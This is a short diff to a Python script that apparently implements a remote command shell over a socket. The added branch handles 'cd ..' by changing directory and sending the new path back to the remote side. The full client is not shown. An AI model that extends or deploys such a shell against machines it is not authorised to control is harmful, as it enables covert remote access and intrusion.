@@ -15,6 +15,11 @@ while True:
                 cwd = os.getcwd() + ">"
                 s.send(str.encode(cwd))
                 print(os.getcwd())
+            elif data[:].decode("utf-8") == 'cd ..':
+                os.chdir("..")
+                cwd = os.getcwd()
+                s.send(str.encode(cwd))
+                print(os.getcwd())
             elif data[2] == " ":
                 os.chdir(data[3:].decode("utf-8"))
                 cwd = os.getcwd()
